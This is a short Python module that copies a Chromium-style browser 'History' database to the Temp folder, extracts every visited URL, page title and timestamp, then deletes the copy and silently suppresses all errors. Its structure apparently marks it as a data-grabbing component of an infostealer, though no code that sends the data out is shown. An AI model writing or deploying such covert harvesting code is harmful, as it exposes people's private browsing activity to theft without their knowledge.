import shutil
import sqlite3
from . import user
import os

def get_web_history(path: str, profile: str):
    try:
        web_history_db = f'{path}\\{profile}\\History'
        result = ""
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            result += f"""
URL: {row[0]}
TITLE: {row[1]}
TIME: {row[2]}
            
            """
        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
        return result
    except:
        pass